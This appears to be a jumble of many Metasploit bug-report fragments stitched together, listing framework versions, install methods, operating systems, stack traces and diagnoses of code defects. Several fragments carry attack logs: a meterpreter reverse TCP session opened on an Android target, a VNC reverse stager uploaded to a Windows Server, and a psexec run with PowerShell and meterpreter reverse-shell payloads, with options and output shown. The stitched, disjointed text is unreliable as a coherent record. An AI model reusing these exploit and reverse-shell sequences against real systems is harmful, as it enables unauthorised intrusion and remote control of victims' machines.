- 0cbfaccc7d5e2a95a34abf4b39c3c1a3dd85e4ee (origin/master, origin/head, master) automatic module_metadata_base.json update ### i installed metasploit with:
- docker ### os
- archlinux
root@kali:~# msfconsole -v
framework version: 5.0.42-dev ### i installed metasploit with:
- [ +] kali package via apt ### os root@kali:~# uname -a
linux kali 5.2.0-kali2-amd64 #1 smp debian 5.2.9-2kali1 (2019-08-22) x86_64 gnu/linux
framework: 5.0.41-dev
console : 5.0.41-dev ### i installed metasploit with:
- [x] kali package via apt ### os what os are you running metasploit on? 'uname -a'
linux kali 4.19.0-kali5-amd64 #1 smp debian 4.19.37-6kali1 (2019-07-22) x86_64 gnu/linux
framework: 5.0.41-dev
console : 5.0.41-dev ### i installed metasploit with:
- [x] kali package via apt ### os what os are you running metasploit on?
linux kali 4.19.0-kali5-amd64 #1 smp debian 4.19.37-6kali1 (2019-07-22) x86_64 gnu/linux edit : i added a proper stack trace
framework: 5.0.41-dev-dbe856297acd2517fd601dbac34e46889d174870
console : 5.0.41-dev-dbe856297acd2517fd601dbac34e46889d174870 ### i installed metasploit with:
- [ ] kali package via apt
- [ ] omnibus installer (nightly)
- [*] commercial/community installer (from
- [ ] source install (please specify ruby version) ### os what os are you running metasploit on? latest macos mojave version 10.14
framework: 5.0.41-dev-dbe856297acd2517fd601dbac34e46889d174870
console : 5.0.41-dev-dbe856297acd2517fd601dbac34e46889d174870 ### i installed metasploit with:
- [ ] kali package via apt
- [ ] omnibus installer (nightly)
- [*] commercial/community installer (from
- [ ] source install (please specify ruby version) ### os what os are you running metasploit on? latest macos mojave version 10.14
msf5 > version
framework: 5.0.38-dev
console : 5.0.38-dev ### i installed metasploit with:
- [x] kali package via apt
- [ ] omnibus installer (nightly)
- [ ] commercial/community installer (from
- [ ] source install (please specify ruby version) ### os what os are you running metasploit on? root@fedora-linux:~# cat /etc/os-release
pretty_name="kali gnu/linux rolling"
name="kali gnu/linux"
version="2019.2"
version_id="2019.2"
id_like=debian
ansi_color="1;31"
home_url=" "
support_url=" "
bug_report_url=" "
i use the latest msf version from git (metasploit v5.0.39-dev-6bd7f6cb4a) ### i installed metasploit with:
- source install (ruby 2.5.5p157) ### os kali
- 4.17.17-dev
- v5.0.39-dev ### i installed metasploit with:
- [x] kali package via apt
- [x] omnibus installer (nightly)
- [x] commercial/community installer (from
- [ ] source install (please specify ruby version) ### os linux and ubuntu.
5.0.37-dev ### i installed metasploit with:
- [x] kali package via apt
- [ ] omnibus installer (nightly)
- [ ] commercial/community installer (from
- [ ] source install (please specify ruby version)
framework: 5.0.35-dev
console : 5.0.35-dev ### i installed metasploit with:
- [x ] kali package via apt
- [ ] omnibus installer (nightly)
- [ ] commercial/community installer (from
- [ ] source install (please specify ruby version) ### os what os are you running metasploit on? linux kali 4.19.0-kali5-amd64 #1 smp debian 4.19.37-5kali1 (2019-06-20) x86_64 gnu/linux
msf5 exploit(windows/smb/ms17_010_eternalblue) > version
framework: 5.0.34-dev
console : 5.0.34-dev
``` ### i installed metasploit with:
- [x] kali package via apt
- [ ] omnibus installer (nightly)
- [ ] commercial/community installer (from
- [ ] source install (please specify ruby version) ### os kali
framework: 5.0.36-dev-
console : 5.0.36-dev- ### i installed metasploit with:
install using rpm package
metasploit-framework-5.0.36+20190707102508~1rapid7-1.el6.x86_64.rpm ### os what os are you running metasploit on?
centos7 sorry for my english if need more log, i can upload in the issue!
msf5 > version
framework: 5.0.36-dev-
console : 5.0.36-dev-
``` ### i installed metasploit with:
- [x] omnibus installer (nightly) ### os running metasploit on ubuntu 16.04.6 x64.
framework: 5.0.34-dev console : 5.0.34-dev ### i installed metasploit with:
- [x] kali package via apt
- [ ] omnibus installer
- [ ] commercial/community installer
- [ ] source install
metasploit v.5.0.35-dev ### i installed metasploit with: nightly installer ### os debain
current `master`: `v5.0.34-dev-58e36b6` ### i installed metasploit with:
- [ ] kali package via apt
- [ ] omnibus installer (nightly)
- [ ] commercial/community installer (from
- [x] source install (please specify ruby version) ruby version: `ruby 2.6.2p47 (2019-03-13 revision 67232) [x86_64-linux]` ### os ubuntu linux 16.04.3 lts (x64)
msf5 auxiliary(scanner/ssh/ssh_login) > version
framework: 5.0.30-dev
console : 5.0.30-dev
``` ### i installed metasploit with:
- [x] kali package via apt ### os what os are you running metasploit on?
root@kali:~# uname -a
linux kali 4.19.0-kali5-amd64 #1 smp debian 4.19.37-5kali1 (2019-06-20) x86_64 gnu/linux
msf5 > version
framework: 5.0.31-dev-8244457b33
console : 5.0.31-dev-8244457b33
``` ### i installed metasploit with: - [ ] source install (ruby v2.6.2) ### os debian
framework: 5.0.29-dev-
console : 5.0.29-dev-
``` ### i installed metasploit with:
- [ ] kali package via apt
- [x] omnibus installer (nightly)
- [ ] commercial/community installer (from
- [ ] source install (please specify ruby version) ### os what os are you running metasploit on? `debian gnu/linux 9 \ \\l`
msf5 > version
framework: 5.0.30-dev-eb8e0e238d
console : 5.0.30-dev-eb8e0e238d
``` ### i installed metasploit with:
- [ ] kali package via apt
- [ ] omnibus installer (nightly)
- [ ] commercial/community installer (from
- [x] source install (please specify ruby version) ### os macos
** metasploit v5.0.30-dev- **### i installed metasploit with:**
- [1 ] kali package via apt **### os** what os are you running metasploit on? kali gnu/linux rolling
release: 2019.2
version 5.0.28-dev ### i installed metasploit with:
- [ x] kali package via apt
- [x ] omnibus installer (nightly) ### os
linux kali 4.19.0-kali5-amd64 #1 smp debian 4.19.37-2kali1 (2019-05-15) x86_64 gnu/linux
framework: 5.0.27-dev-01de6954fe
console : 5.0.27-dev-01de6954fe
``` ### i installed metasploit with:
- [ ] kali package via apt
- [ ] omnibus installer (nightly)
- [ ] commercial/community installer (from
- [x] source install (please specify ruby version) 2.6.2 ### os arch linux @sempervictus
latest master ### i installed metasploit with:
- [x] omnibus installer (nightly) ### os what os are you running metasploit on? ubuntu
### i installed metasploit with:
- [ ] kali package via apt
- [ ] omnibus installer (nightly)
- [ ] commercial/community installer (from
- [ ] source install (please specify ruby version) ### os what os are you running metasploit on?
frameework: 5.0.24-dev
console: 5.0.24-dev ### i installed metasploit with:
kali pre-installed
version 5.0.23-dev ### i installed metasploit with:
- [x] kali package via apt ### os running metasploit on kali linux 2019.2 ### target os android 8.0.0 & android 6.0.1 ### log ``msf5 exploit(multi/handler) > exploit`` ``[-] handler failed to bind to 91.137.105.193:1604:- -``
``[*] started reverse tcp handler on 0.0.0.0:1604 ``
``[*] sending stage (179779 bytes) to 91.137.105.193``
``[*] meterpreter session 1 opened (192.168.178.49:1604 -> 91.137.105.193:41772) at 2019-05-25 17:09:44 +0200``
``[*] 91.137.105.193 - meterpreter session 1 closed.`` ### additional info if metasploit handler is not listening the app works fine
as soon as i type exploit the app stops working.
msf5 > version > framework: 5.0.22-dev
> console : 5.0.22-dev ### i installed metasploit with:
- [x] kali package via apt
- [ ] omnibus installer (nightly)
- [ ] commercial/community installer (from
- [ ] source install (please specify ruby version) ### os what os are you running metasploit on? kali linux 2019a updated
framework: 5.0.21-dev
console : 5.0.21-dev ### i installed metasploit with:
- [x] kali package via apt
- [ ] omnibus installer (nightly)
- [ ] commercial/community installer (from
- [ ] source install (please specify ruby version) ### os kali linux 2019.1 regularly updated.
linux sailslack 4.19.0-kali5-amd64 #1 smp debian 4.19.37-1kali1 (2019-05-09) x86_64 gnu/linux
### i installed metasploit with:
framework: 5.0.21-dev-
console : 5.0.21-dev- source install (please specify ruby version) ### os linux mint 19.1
msf5 > version framework: 5.0.20-dev
console : 5.0.20-dev
msf5 > ``` ### i installed metasploit with:
- [x] kali package via apt
- [x] omnibus installer (nightly)
- [ ] commercial/community installer (from
- [ ] source install (please specify ruby version) ### os what os are you running metasploit on? kali linux rolling
msf5 > version
framework: 5.0.18-dev
console : 5.0.18-dev
``` ### i installed metasploit with:
- [ x] kali package via apt
- [ ] omnibus installer (nightly)
- [ ] commercial/community installer (from
- [ ] source install (please specify ruby version) ### os what os are you running metasploit on?
linux kali 4.19.0-kali4-amd64 #1 smp debian 4.19.28-2kali1 (2019-03-18) x86_64 gnu/linux
framework: 5.0.16-dev
console : 5.0.16-dev ### i installed metasploit with:
- [x] kali package via apt ### os
framework: 5.0.16-dev
console : 5.0.16-dev ### i installed metasploit with:
- [x] kali package via apt ### os
framework: 5.0.14-dev-3524e5c0ee
console : 5.0.14-dev-3524e5c0ee
``` ### i installed metasploit with:
- [ ] source install (ruby 2.6.2p47 (2019-03-13 revision 67232) [x86_64-linux]
) ### os what os are you running metasploit on? ubuntu 18.04.2 lts
framework: 5.0.16-dev
console : 5.0.16-dev ### i installed metasploit with:
- [ ] kali package via apt
- [ ] omnibus installer (nightly)
- [ ] commercial/community installer (from
- [ ] source install (please specify ruby version) ### os what os are you running metasploit on?
msf5 > version
framework: 5.0.17-dev-6bf824d200
console : 5.0.17-dev-6bf824d200
``` ### i installed metasploit with:
i have a fork of metasploit ### os
i observed this on macos
5.0.2-dev ### i installed metasploit with:
- [ ] kali package via apt ### os what os are you running metasploit on? kali linux mate lastest version
framework: 5.0.15-dev-
console : 5.0.15-dev- ### i installed metasploit with: curl > msfinstall && \\ chmod 755 msfinstall && \\ ./msfinstall ### os debian 9 what os are you running metasploit on?
metasploit v5.0.0-dev- ### i installed metasploit with:
- [ ] kali package via apt
- [ ] omnibus installer (nightly)
- [ *] commercial/community installer (from
- [ ] source install (please specify ruby version) ### os what os are you running metasploit on?
framework: 5.0.14-dev-6218d8920da2338804cd007926b5053740145a41
console : 5.0.14-dev-6218d8920da2338804cd007926b5053740145a41 ### i installed metasploit with: ' - macos version
### os macos
metasploit v5.0.12-dev, ### i installed metasploit with:
installed via apt from kali subsystem on win10, ### os
kali linux from windows 10 shop as subsystem
`{"version"=>"5.0.13-dev-2bb0d84", "ruby"=>"2.6.1 x86_64-linux 2019-01-30", "api"=>"1.0"}` ### i installed metasploit with:
- [x] source install (please specify ruby version)
`"ruby"=>"2.6.1 x86_64-linux 2019-01-30"`
### os what os are you running metasploit on?
name="linux mint"
version="18.2 (sonya)"
pretty_name="linux mint 18.2"
version_codename=sonya
ubuntu_codename=xenial
tried it on both 4.17.3 and 5.02-dev ### i installed metasploit with:
- [ ] kali package via apt ### os kali
framework: 5.0.11-dev-996c406e71
console : 5.0.11-dev-996c406e71 ### i installed metasploit with:
- [ ] kali package via apt
- [ ] omnibus installer (nightly)
- [ ] commercial/community installer (from
- [x ] source install (please specify ruby version) ### os what os are you running metasploit on?
10.13.3 i did try reinitializing the database and had the same problem
i have installed the latest version:- 5.0.8-0kali1 ### i installed metasploit with:
kali package via apt ### os
kali linux version="2019.1"
framework: 5.0.10-dev-168a98f66b2cfdd14c71458851167b79016f37c8
console : 5.0.10-dev-168a98f66b2cfdd14c71458851167b79016f37c8 ### i installed metasploit with:
- [ ] kali package via apt
- [ ] omnibus installer (nightly)
- [ ] commercial/community installer (from
- [ ] source install (please specify ruby version)
- [x] homebrew ### os
macos 10.14.3
framework: 5.0.9-dev-d78a9978e065a38dae185a38832eb8ff14431d64
console : 5.0.9-dev-d78a9978e065a38dae185a38832eb8ff14431d64 ### i installed metasploit with: the windows installer at: ### os windows 10 (build 17763.316)
framework and console: 5.0.8-dev ### i installed metasploit with:
[x] kali package via apt ### os
framework: 5.0.9-dev-aa0ba91d92ae9324c1c0014d39d1372ed8f789c6
console : 5.0.9-dev-aa0ba91d92ae9324c1c0014d39d1372ed8f789c6 ### i installed metasploit with:
- [ ] kali package via apt
- [x] omnibus installer (nightly)
- [ ] commercial/community installer (from
- [ ] source install (please specify ruby version) ### os mac os 10.13.6
v5.0.8-dev ```
# apt-cache policy metasploit-framework
metasploit-framework: installed: 5.0.8-0kali1 candidate: 5.0.8-0kali1
``` ### i installed metasploit with:
- [x ] kali package via apt
- [ ] omnibus installer (nightly)
- [ ] commercial/community installer (from
- [ ] source install (please specify ruby version) ### os what os are you running metasploit on? kali linux, all packages up to date.
5.0.9f-dev ### i installed metasploit with:
- [ ] commercial/community installer (from ### os centos 7.6.1810 kernel: 3.10.0-693.11.6.el7.x86_64
framework: 5.0.8-dev-a3d0c93ff7
console : 5.0.8-dev-a3d0c93ff7 ### i installed metasploit with:
git clone ### os
fedora core 28
framework: 5.0.6-dev
console : 5.0.6-dev ### i installed metasploit with:
- [x] kali package via apt
- [ ] omnibus installer (nightly)
- [ ] commercial/community installer (from
- [ ] source install (please specify ruby version) ### os kali linux (fully updated as of time of posting) notes:
- my "default" workspace is unaffected
- if i export the workspace to a file, the creds section is empty
- the "creds" table in the postgresql database is *empty* (verified with psql), even though i had some credentials before the incident.
- there is nothing sensitive in this workspace (just playing around with metasploitable), so i'm happy to provide dumps and exports if that will help.
msf5 auxiliary(scanner/telnet/lantronix_telnet_password) > db_status
[*] connected to remote_data_service: (
connection type: http
connection name: local-https-data-service.
msf5 auxiliary(scanner/telnet/lantronix_telnet_password) > version
framework: 5.0.7-dev-
console : 5.0.7-dev-
``` ### i installed metasploit with: - [x ] omnibus installer (nightly) ### os fedora 29 ``` cat /etc/redhat-release
fedora release 29 (twenty nine)
linux xxxx 4.19.9-300.fc29.x86_64 #1 smp thu dec 13 17:25:01 utc 2018 x86_64 x86_64 x86_64 gnu/linux
msf5 exploit(multi/handler) > version
framework: 5.0.5-dev
console : 5.0.5-dev
``` ### i installed metasploit with:
kali package via apt
attacker: kalilinux victim: windows server 2012 r2 x64
(firewall is disabled and no antivirus software) however, i tried the reverse connection
it's doesn't work,too
the error messages are similar.
meterpreter > run vnc -r 47.*.*.219 -o [*] creating a vnc reverse tcp stager: lhost=47.*.*.219 lport=4545
[*] running payload handler
[*] vnc stager executable 73802 bytes long
[*] uploaded the vnc agent to c:\\windows\\temp\\jdonflqqnl.exe (must be deleted manually)
[*] executing the vnc agent with endpoint 47.*.*.219:4545...
meterpreter > /usr/bin/vncviewer: vnc server closed connection [02/15/2019 23:42:31] [e(0)] rex: error in #<rex::services::localrelay: > monitor_relays read: end of file reached
``` [payloads.zip](
`5.0.5-dev-68d05d2f80` ### i installed metasploit with:
`git clone` ### os
framework: 5.0.5-dev-
console : 5.0.5-dev- ### i installed metasploit with:
- [x] kali package via apt
- [ ] omnibus installer (nightly)
- [ ] commercial/community installer (from
- [ ] source install (please specify ruby version) ### os what os are you running metasploit on? linux 4.15.0-43-generic #46-ubuntu i tried to debug the code in `wmap.rb`, using my breakpoints, and i found that bug:
in `plugins/wmap.rb`:
``` def cmd_wmap_sites(*args) args.push("-h") if args.length == 0 while (arg = args.shift) case arg when \'-a\' site = args.shift if site s = add_web_site(site) # here the variable `s` always has no member, which is a `{}` returned by the function report_web_site() if s # but it\'s true, so there\'s no error displayed
print_status("site created.") print_status("site=#{site.instance_variables}") else print_error("unable to create site") end
``` that's my exploration, hope it can be fixed.
msf5 auxiliary(scanner/mssql/mssql_login) > version
framework: 5.0.4-dev-7633c2832a
console : 5.0.4-dev-7633c2832a
``` ### i installed metasploit with:
- [ ] kali package via apt
- [ ] omnibus installer (nightly)
- [ ] commercial/community installer (from
- [x ] source install (please specify ruby version) ```
ruby 2.5.3p105 (2018-10-18 revision 65156) [x86_64-linux-gnu]
``` ### os kali
`d078fcd87c6e68f5470481b1dacf0632c79b2c76 (head -> sessions-range-fix, origin/master, origin/head, master) land #11270, fix miscellaneous loot issues` (`sessions-range-fix` is the name of the branch in my own fork) ### i installed metasploit with:
- [ ] kali package via apt
- [ ] omnibus installer (nightly)
- [ ] commercial/community installer (from
- [x] source install (please specify ruby version) - ruby version: ruby 2.5.3p105 (2018-10-18 revision 65156) [x86_64-linux] ### os fedora linux i will be providing a pr in a little bit, i have the issue fixed, but i just wanted a proper issue to reference
nightly installer as of this week
framework: 5.0.1-dev- console : 5.0.1-dev- ``` ### i installed metasploit with:
- [ ] kali package via apt
- [x] omnibus installer (nightly)
- [ ] commercial/community installer (from
- [ ] source install (please specify ruby version) ### os
> msf5 > version
> framework: 5.0.1-dev
> console : 5.0.1-dev
> msf5 > log file for system1: [framework.log]( log file for system2:
[system2-framework.log]( ### i installed metasploit with:
came with kali 2018.4 + apt upgrade - [ x] kali package via apt
- [ ] omnibus installer (nightly)
- [ ] commercial/community installer (from
- [ ] source install (please specify ruby version) ### os what os are you running metasploit on? ####system 1####
root@secaudit:~: uname -a
linux secaudit 4.19.0-kali1-amd64 #1 smp debian 4.19.13-1kali1 (2019-01-03) x86_64 gnu/linux
root@secaudit:~: cat /proc/version
linux version 4.19.0-kali1-amd64 (devel@kali.org) (gcc version 8.2.0 (debian 8.2.0-13)) #1 smp debian 4.19.13-1kali1 (2019-01-03) root@secaudit:~: lsmem
memory block size: 128m
total online memory: 16g
total offline memory: 0b root@secaudit:~: free -h total used free shared buff/cache available
mem: 15gi 1.7gi 1.6gi 8.3gi 12gi 5.3gi
swap: 15gi 0b 15gi root@secaudit:~: lscpu
architecture: x86_64
cpu op-mode(s): 32-bit, 64-bit
byte order: little endian
address sizes: 36 bits physical, 48 bits virtual
on-line cpu(s) list: 0-3
thread(s) per core: 1
core(s) per socket: 4
socket(s): 1
numa node(s): 1
vendor id: genuineintel
cpu family: 6
model name: intel(r) core(tm) i5-3470 cpu @ 3.20ghz #### system 2 ####
vm running on the physical machine above
root@kalivm:~: uname -a
linux kalivm 4.19.0-kali1-amd64 #1 smp debian 4.19.13-1kali1 (2019-01-03) x86_64 gnu/linux root@kalivm:~: cat /proc/version
linux version 4.19.0-kali1-amd64 (devel@kali.org) (gcc version 8.2.0 (debian 8.2.0-13)) #1 smp debian 4.19.13-1kali1 (2019-01-03) root@kalivm:~: lsmem
memory block size: 128m
total online memory: 8g
total offline memory: 0b root@kalivm:~: free -h total used free shared buff/cache available
mem: 7.8gi 1.1gi 5.9gi 196mi 884mi 6.3gi
swap: 4.3gi 0b 4.3gi root@kalivm:~: lscpu
architecture: x86_64
cpu op-mode(s): 32-bit, 64-bit
byte order: little endian
address sizes: 43 bits physical, 48 bits virtual
on-line cpu(s) list: 0-3
thread(s) per core: 1
core(s) per socket: 1
socket(s): 4
numa node(s): 1
vendor id: genuineintel
cpu family: 6
model name: intel(r) core(tm) i5-3470 cpu @ 3.20ghz
### i installed metasploit with:
- [x ] kali package via apt
- [ ] omnibus installer (nightly)
- [ ] commercial/community installer (from
- [x ] source install (please specify ruby version) ### os kali ### solution
i also found the solution
there is a broken return statement in the smb-client library file.
if you check /usr/share/metasploit-framework/lib/rex/proto/smb/client.rb in line 657 you will see that the return statement contains `*args`, which is not defined there
so this line has to be changed to `return session_setup_clear(user, pass, domain)` and it works pretty smoothely again
i hope you could include this in the new metasploit version
i checked and found that the bug is still there.
4.17.32-dev- for framework and console
### i installed metasploit with:
- [ x] kali package via apt
- [ ] omnibus installer (nightly)
- [ ] commercial/community installer (from
- [ ] source install (please specify ruby version) ### os what os are you running metasploit on?
ubuntu 18.04.1 lts "bionic"
4.17 ### i installed metasploit with:
- [x ] kali package via apt
- [ ] omnibus installer (nightly)
- [ ] commercial/community installer (from
- [ ] source install (please specify ruby version) ### os what os are you running metasploit on?
framework version: 5.0.0-dev-7084538b8c ### i installed metasploit with:
- [ ] kali package via apt
- [ ] omnibus installer (nightly)
- [ ] commercial/community installer (from
- [x] source install (please specify ruby version) ### os
ubuntu 18.10 server edition
ruby 2.5.1p57 (2018-03-29 revision 63029) [x86_64-linux-gnu]
`msfvenom --version: version unknown` ### i installed metasploit with:
- [ ] kali package via apt ### os what os are you running metasploit on? ubuntu-16.04.01
framework: 4.17.21-dev
console : 4.17.21-dev ### i installed metasploit with:
- [ ] kali package via apt ### os kali rolling.
framework: 4.17.21-dev
console : 4.17.21-dev ### i installed metasploit with:
- [x] kali package via apt ### os distributor id: kali
description: kali gnu/linux rolling
release: kali-rolling
codename: kali-rolling
version="2018.4"
framework: 4.17.18-dev-
console : 4.17.18-dev- ### i installed metasploit with:
- [x] commercial/community installer (from ### os debian 9
framework: 5.0.0-dev-6920470f99
console : 5.0.0-dev-6920470f99 ### i installed metasploit with:
- git (community edition) ### os linux kali 4.18.0-kali2-amd64 #1 smp debian 4.18.10-2kali1 (2018-10-09) x86_64 gnu/linux
framework: 4.17.17-dev-2ce34b4a0e4c4610079fad98a50e068bd50be6fa
console : 4.17.17-dev-2ce34b4a0e4c4610079fad98a50e068bd50be6fa ### i installed metasploit with:
windows installer from official website this is a fresh install and i have limited experience running metasploit on windows so i'm not sure if this is a bug or if there is some configuration needed on my end.
`e05ee281905d58bee9627177bcfa0b271f79906f (head -> master, upstream/master) weekly dependency update` ### i installed metasploit with:
- [ ] source install (`ruby 2.5.1p57 (2018-03-29 revision 63029) [x86_64-darwin17]`) ### os osx 10.13.6
commit 1370b59e6698452adf2b0c99da85669c4a19ec07
author: metasploit <metasploit@rapid7.com>
date: sat aug 25 20:31:52 2018 -0700 automatic module_metadata_base.json update
``` ### i installed metasploit with:
- [ ] kali package via apt
- [ ] omnibus installer (nightly)
- [ ] commercial/community installer (from
- [x] source install (please specify ruby version) ### os `darwin greens-macbook-pro.local 17.7.0 darwin kernel version 17.7.0: thu jun 21 22:53:14 pdt 2018; root:xnu-4570.71.2~1/release_x86_64 x86_64` ```
ruby 2.5.1p57 (2018-03-29 revision 63029) [x86_64-darwin17]
``` cc: @wchen-r7
4.17.5-dev on manjaro
4.17.13-dev on kali
metasploit v5.0.0-dev-dcb96c20a0 ### i installed metasploit with: bundle install ruby v2.3.0 ### os raspbian
msf5 auxiliary(admin/http/joomla_registration_privesc) > version
framework: 5.0.0-dev-5ddbf6fd11
console : 5.0.0-dev-5ddbf6fd11
``` ### i installed metasploit with:
- [ ] kali package via apt
- [ ] omnibus installer (nightly)
- [ ] commercial/community installer (from
- [x] source install (please specify ruby version) ```
ruby 2.5.1p57 (2018-03-29 revision 63029) [x86_64-darwin17]
``` ### os what os are you running metasploit on?
`macos 13.6` ### dig it i have drilled it down, the exception occurred at:
file: lib/msf/core/exploit/tcp.rb nsock = rex::socket::tcp.create( \'peerhost\' => opts[\'rhost\'] || rhost, \'peerport\' => (opts[\'rport\'] || rport).to_i, \'localhost\' => opts[\'chost\'] || chost || "0.0.0.0", \'localport\' => (opts[\'cport\'] || cport || 0).to_i, \'ssl\' => dossl, \'sslversion\' => opts[\'sslversion\'] || ssl_version, \'sslverifymode\' => opts[\'sslverifymode\'] || ssl_verify_mode, \'sslcipher\' => opts[\'sslcipher\'] || ssl_cipher, \'proxies\' => proxies, \'timeout\' => (opts[\'connecttimeout\'] || connect_timeout || 10).to_i, \'context\' => { \'msf\' => framework, \'msfexploit\' => self, })
the method `rex::socket::tcp.create` would call the method `socket.gethostbyname`:
from: /users/green/.rvm/gems/ruby-2.5.1@metasploit-framework/gems/rex-socket-0.1.15/lib/rex/socket.rb @ line 189 rex::socket.getaddresses: 184: def self.getaddresses(hostname, accept_ipv6 = true) 185: if hostname =~ match_ipv4 || (accept_ipv6 && hostname =~ match_ipv6) 186: return [hostname] 187: end 188: => 189: res = ::socket.gethostbyname(hostname) 190: return [] if not res 191:
``` `socket.gethostbyname` cannot accept `rhosts`, which is like `1.1.1.1/24`, so it would throw the exception.
[13] pry(main)> socket.gethostbyname("8.8.8.8")
=> ["8.8.8.8", [], 2, "\\b\\b\\b\\b"]
[14] pry(main)> socket.gethostbyname("8.8.8.8/24")
socketerror: getaddrinfo: nodename nor servname provided, or not known
from (pry):36:in `gethostbyname'
``` i guess there are many modules exist this issue, which include `msf::exploit::remote::tcp` and `msf::exploit::remote::httpclient`
maybe related #9246.
888dc43a7e1b64d7d5098d06b038cc18f6a6949f (head -> master, origin/master, origin/head) land #10348, add rest api for module queries ### i installed metasploit with:
- [ ] kali package via apt
- [ ] omnibus installer (nightly)
- [ ] commercial/community installer (from
- [x] source install (please specify ruby version) ### os fedora 28
### notes i'm going to give this issue to myself, as i'm the pleb that wrote the thing in the first place.
framework: 4.17.5-dev
console : 4.17.5-dev ### i installed metasploit with:
- [ ] kali package via apt
- [x ] omnibus installer (nightly)
- [ ] commercial/community installer (from versi)
- [ ] source install (please specify ruby version) ### os ubuntu 18.0 is this issue related to the version that i have pulled? -dev?
verison: `framework version: 4.17.6-dev-` ### i installed metasploit with:
- [x] kali package via apt
- [ ] omnibus installer (nightly)
- [ ] commercial/community installer (from
- [ ] source install (please specify ruby version) ### os ```
linux sssss-debian-tor1 4.15.12-041512-generic #201803211230 smp wed mar 21 12:32:19 utc 2018 x86_64 gnu/linu
``` @wvu-r7 @jmartin-r7
4.17.4 ### i installed metasploit with:
- [x ] omnibus installer (nightly) ### os what os are you running metasploit on?
ubuntu 18.04.1 lts
metasploit v4.17.2-dev ``` ### i installed metasploit with:
- [ x] kali package via apt ### os what os are you running metasploit on?
framework: 4.16.63-dev
console : 4.16.63-dev ### i installed metasploit with:
- [ ] kali package via apt ### os kali linux
framework: 5.0.0-dev-b9192d1bdb
console : 5.0.0-dev-b9192d1bdb ### i installed metasploit with:
- pentestbox ### os windows 10 pro 64bit
fully up-to-date with rapid7/metasploit-framework:master >```
>framework: 5.0.0-dev-ef78d70a00
>console : 5.0.0-dev-ef78d70a00
>``` ### i installed metasploit with:
- [ ] kali package via apt
- [ ] omnibus installer (nightly)
- [ ] commercial/community installer (from
- [x] *source install* (please specify ruby version): `ruby 2.5.1p57 (2018-03-29 revision 63029)` ### os what os are you running metasploit on? **parrot linux 4.1 (fully patched)**
msf5 > version
framework: 5.0.0-dev-5a693aa89c
console : 5.0.0-dev-5a693aa89c ### i installed metasploit with:
- [ ] kali package via apt
- [ ] omnibus installer (nightly)
- [ ] commercial/community installer (from
- [x] source install (please specify ruby version) ### os parrot linux 4.1 `ruby 2.5.1p57 (2018-03-29 revision 63029) [x86_64-linux-gnu]`
msf5 exploit(windows/smb/psexec) > version
framework: 5.0.0-dev-d322148
console : 5.0.0-dev-d322148 ### i installed metasploit with:
- [ ] kali package via apt
- [ ] omnibus installer (nightly)
- [ ] commercial/community installer (from
- [x] source install (please specify ruby version) ruby-2.5.1 ### os what os are you running metasploit on?
linux ubuntu 4.4.0-128-generic #154-ubuntu smp fri may 25 14:15:18 utc 2018 x86_64 x86_64 x86_64 gnu/linux
msf5 exploit(windows/smb/psexec) > version
framework: 5.0.0-dev-d322148
console : 5.0.0-dev-d322148
tmoose@ubuntu:~/rapid7/metasploit-framework$ git log | head -n 5
commit d322148d8d6c6bf07b55d5769c6e720b40532c08
author: metasploit <metasploit@rapid7.com>
date: fri jun 29 15:55:57 2018 -0700 automatic module_metadata_base.json update ``` ### i installed metasploit with:
- [ ] kali package via apt
- [ ] omnibus installer (nightly)
- [ ] commercial/community installer (from
- [ x ] source install (please specify ruby version)
ruby-2.5.1 ### os what os are you running metasploit on?
msfconsole running on `linux ubuntu 4.4.0-128-generic #154-ubuntu smp fri may 25 14:15:18 utc 2018 x86_64 x86_64 x86_64 gnu/linux` ### windows 2016
msf5 exploit(windows/smb/psexec) > show options module options (exploit/windows/smb/psexec): name current setting required description ---- --------------- -------- ----------- rhosts 192.168.134.112 yes the target address range or cidr identifier rport 445 yes the smb service port (tcp) service_description no service description to to be used on target for pretty listing service_display_name no the service display name service_name no the service name share admin$ yes the share to connect to, can be an admin share (admin$,c$,...) or a normal read/write folder share smbdomain
no the windows domain to use for authentication smbpass [redacted] no the password for the specified username smbuser [redacted] no the username to authenticate as payload options (windows/x64/powershell_reverse_tcp): name current setting required description ---- --------------- -------- ----------- exitfunc thread yes exit technique (accepted: '', seh, thread, process, none) lhost 192.168.135.111 yes the listen address (an interface may be specified) load_modules no a list of powershell modules seperated by a comma to download over the web lport 4567 yes the listen port exploit target: id name -- ---- 0 automatic msf5 exploit(windows/smb/psexec) > run [*] started reverse ssl handler on 192.168.135.111:4567 [*] 192.168.134.112:445 - connecting to the server...
[*] 192.168.134.112:445 - authenticating to 192.168.134.112:445 as user '[redacted]'...
[!] 192.168.134.112:445 - no active db -- credential data will not be saved!
[*] 192.168.134.112:445 - checking for system32\\windowspowershell\\v1.0\\powershell.exe
[*] 192.168.134.112:445 - powershell found
[*] 192.168.134.112:445 - selecting powershell target
[*] 192.168.134.112:445 - powershell command length: 3977
[*] 192.168.134.112:445 - executing the payload...
[*] 192.168.134.112:445 - binding to 367abb81-9844-35f1-ad32-98f038001003:2.0@ncacn_np:192.168.134.112[\\svcctl] ...
[*] 192.168.134.112:445 - bound to 367abb81-9844-35f1-ad32-98f038001003:2.0@ncacn_np:192.168.134.112[\\svcctl] ...
[*] 192.168.134.112:445 - obtaining a service manager handle...
[*] 192.168.134.112:445 - creating the service...
[+] 192.168.134.112:445 - successfully created the service
[*] 192.168.134.112:445 - starting the service...
[+] 192.168.134.112:445 - service start timed out, ok if running a command or non-service executable...
[*] 192.168.134.112:445 - removing the service...
[+] 192.168.134.112:445 - successfully removed the service
[*] 192.168.134.112:445 - closing service handle...
[*] exploit completed, but no session was created.
msf5 exploit(windows/smb/psexec) > set payload windows/x64/meterpreter/reverse_https
payload => windows/x64/meterpreter/reverse_https
msf5 exploit(windows/smb/psexec) > show options module options (exploit/windows/smb/psexec): name current setting required description ---- --------------- -------- ----------- rhosts 192.168.134.112 yes the target address range or cidr identifier rport 445 yes the smb service port (tcp) service_description no service description to to be used on target for pretty listing service_display_name no the service display name service_name no the service name share admin$ yes the share to connect to, can be an admin share (admin$,c$,...) or a normal read/write folder share smbdomain
no the windows domain to use for authentication smbpass [redacted] no the password for the specified username smbuser [redacted] no the username to authenticate as payload options (windows/x64/meterpreter/reverse_https): name current setting required description ---- --------------- -------- ----------- exitfunc thread yes exit technique (accepted: '', seh, thread, process, none) lhost 192.168.135.111 yes the local listener hostname lport 4567 yes the local listener port luri no the http path exploit target: id name -- ---- 0 automatic msf5 exploit(windows/smb/psexec) > run [*] started https reverse handler on
[*] 192.168.134.112:445 - connecting to the server...
